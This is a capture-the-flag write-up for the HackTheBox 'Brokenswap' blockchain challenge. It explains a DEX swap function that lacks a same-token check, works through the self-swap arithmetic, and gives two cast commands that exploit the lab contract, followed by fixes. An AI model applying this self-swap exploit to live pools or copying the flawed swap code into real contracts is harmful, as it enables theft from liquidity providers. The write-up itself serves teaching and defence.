---
layout: post
title: "Brokenswap"
date: 2028-03-21 09:00:00 -0500
categories: [HackTheBox, Challenges, Blockchain]
tags: [hackthebox, challenge, blockchain, solidity, defi, amm, dex, smart-contract, leetswap]
description: "A constant-product DEX that forgets to check the two swap tokens are different. Swap WETH for itself and the pool pays you back nearly double — the same class of bug behind the real LeetSwap hack that drained 340 ETH."
---

## Overview

Brokenswap is a Medium blockchain challenge: a Uniswap-style constant-product AMM holding a 500 WETH / 500 HTB pool. You start with 10 WETH and must reach a balance of at least 15. It is a deliberately simplified replay of the real **LeetSwap hack** of August 2023, which drained ~340 ETH (~$624k).

## The technique

The DEX's `swap` function validates that both tokens are *supported*, but never that they are *different*. Because the payout is computed from the pool's live token balances, swapping a token **for itself** makes both legs of the swap read the same balance — so your own deposit is paid back to you along with the pool's slippage. This is an [improper input validation](https://cwe.mitre.org/data/definitions/20.html) flaw with a business-logic payout.

## Solution

The vulnerable function:

```solidity
function swap(address inputToken, address outputToken, uint256 inputAmount) public returns (bool) {
    require(supportedTokens[inputToken] && supportedTokens[outputToken], "Token not supported");
    // no require(inputToken != outputToken) !
    INVARIANT = inToken.balanceOf(this) * outToken.balanceOf(this);  // snapshot BEFORE deposit
    inToken.safeTransferFrom(msg.sender, this, inputAmount);         // balance += inputAmount
    ...move fee...
    uint256 out = calcOutputAmount(inToken, outToken);              // reads live balances
    outToken.safeTransfer(msg.sender, out);
}

function calcOutputAmount(address inputToken, address outputToken) public view returns (uint256) {
    uint256 balIn  = IERC20(inputToken).balanceOf(this);   // same balance if in == out
    uint256 balOut = IERC20(outputToken).balanceOf(this);
    return balOut - INVARIANT / balIn;
}
```

Swapping `WETH → WETH` with all 10 WETH:

- `INVARIANT = (500e18)²`, snapshotted before the deposit.
- After depositing 10 WETH (minus a 0.05 fee), `balIn = balOut = 509.95e18`.
- `INVARIANT / balIn ≈ 490.24e18`, so `out = 509.95e18 − 490.24e18 ≈ 19.7e18`.

You pay 10 WETH and receive ~19.7 back. Two transactions with Foundry's `cast`:

```bash
cast send $WETH   "approve(address,uint256)" $TARGET 10e18 --private-key $PK --rpc-url $RPC
cast send $TARGET "swap(address,address,uint256)" $WETH $WETH 10e18 --private-key $PK --rpc-url $RPC
```

Player WETH balance goes `10e18 → 19.705…e18`, clearing the `>= 15e18` win condition, and the challenge handler returns the flag:

```
HTB{...}
```

## Why it worked

An AMM assumes the two sides of a swap are distinct reserves. A self-swap collapses the output formula into `balance − k/balance`, which is hugely positive precisely because you just inflated `balance` with your own deposit. The invariant snapshot taken before the transfer, combined with reading live balances for both legs, turns the pool into a money printer.

## Fix / defense

- Add the one missing line: `require(inputToken != outputToken)`.
- Track reserves in stored state and update the invariant `k` atomically after fees, rather than recomputing from `balanceOf(address(this))` mid-call.
- Use Uniswap's `getAmountOut` formula (fee applied to input, reserves read once, distinct token pair) and assert the invariant holds after every swap.
